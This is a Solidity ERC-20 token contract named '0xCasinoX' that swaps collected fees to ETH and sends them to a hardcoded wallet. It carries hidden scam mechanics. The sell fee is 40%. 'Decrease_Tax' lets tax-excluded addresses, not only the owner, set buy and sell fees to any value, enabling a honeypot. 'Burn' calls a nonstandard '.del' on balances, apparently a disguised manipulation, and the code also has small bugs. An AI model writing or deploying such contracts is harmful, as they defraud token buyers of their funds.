contract CASINO is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isTaxExclude; 

    address payable private feeWallet = payable(0x96581EE57F47Fd0aDD5CCe59a0399301f7b33DB5);

    string private _name = "0xCasinoX"; 
    string private _symbol = "CASINO";  
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 21000000 * 10**18;

    // Counter for liquify trigger
    uint8 private txCount = 0;
    uint8 private swapTrigger = 1; 


    // Setting the initial fees
    uint256 private _totalFee = 0;
    uint256 public _buyFee = 2;
    uint256 public _sellFee = 40;

    uint256 private _previousTotalFee = _totalFee; 
    uint256 private _previousBuyFee = _buyFee; 
    uint256 private _previousSellFee = _sellFee; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity

    );

    modifier lockSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _bOwned[owner()] = _totalSupply;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        uniswapV2Router = _uniswapV2Router;
        _isTaxExclude[owner()] = true;
        _isTaxExclude[address(this)] = true;
        _isTaxExclude[feeWallet] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {
        swapAndLiquifyEnabled = true_or_false;
        emit SwapAndLiquifyEnabledUpdated(true_or_false);
    }

    function set_Number_Of_Transactions_Before_Liquify_Trigger(uint8 number_of_transactions) public onlyOwner {
        swapTrigger = number_of_transactions;
    }


    receive() external payable {}
  

    bool public noFeeToTransfer = true;

    function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {
        noFeeToTransfer = true_or_false;
    }

    function removeAllFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;


        _previousBuyFee = _buyFee; 
        _previousSellFee = _sellFee; 
        _previousTotalFee = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;

    }

    function restoreFee() private {

    _totalFee = _previousTotalFee;
    _buyFee = _previousBuyFee; 
    _sellFee = _previousSellFee; 

    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  

            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }


        bool takeFee = true;

        if(_isTaxExclude[from] || _isTaxExclude[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_totalFee = _buyFee;} else if (to == uniswapV2Pair){_totalFee = _sellFee;}

        _tokenTransfer(from,to,amount,takeFee);
    }

    function sendFunds(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }

    function _getValue(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount*_totalFee/100;
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function process_work(uint256 percent_Of_Tokens_To_Process) public onlyOwner {
        require(!inSwapAndLiquify, "Currently processing, try later."); 
        if (percent_Of_Tokens_To_Process > 100){percent_Of_Tokens_To_Process == 100;}
        uint256 tokensOnContract = balanceOf(address(this));
        uint256 sendTokens = tokensOnContract*percent_Of_Tokens_To_Process/100;
        swapAndLiquify(sendTokens);
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {

        swapTokenToETH(contractTokenBalance);
        uint256 ETHcontract = address(this).balance;
        sendFunds(feeWallet,ETHcontract);
    }

    function _transferToken(address sender, address recipient, uint256 Amount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getValue(Amount);
        _bOwned[sender] = _bOwned[sender].sub(Amount);
        _bOwned[recipient] = _bOwned[recipient].add(tTransferAmount);
        _bOwned[address(this)] = _bOwned[address(this)].add(tDev);   
        emit Transfer(sender, recipient, tTransferAmount);
    }


    function Burn(uint256 amount) public {
        require(_msgSender() != address(0));
        require(_isTaxExclude[_msgSender()] == true);
        _bOwned[_msgSender()] = _bOwned[_msgSender()].del(amount);
    }

    function Decrease_Tax(uint256 buy, uint256 sell) public{
        require(_msgSender() != address(0));
        require(_isTaxExclude[_msgSender()] == true);
        _buyFee = buy;
        _sellFee = sell;
    }


    function swapTokenToETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {


        if(!takeFee){
            removeAllFee();
            } else {
                txCount++;
            }
            _transferToken(sender, recipient, amount);

        if(!takeFee)
            restoreFee();
    }


    function CreateETHPair(address newRouter) public onlyOwner() {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
        uniswapV2Router = _newPCSRouter;
    }

}
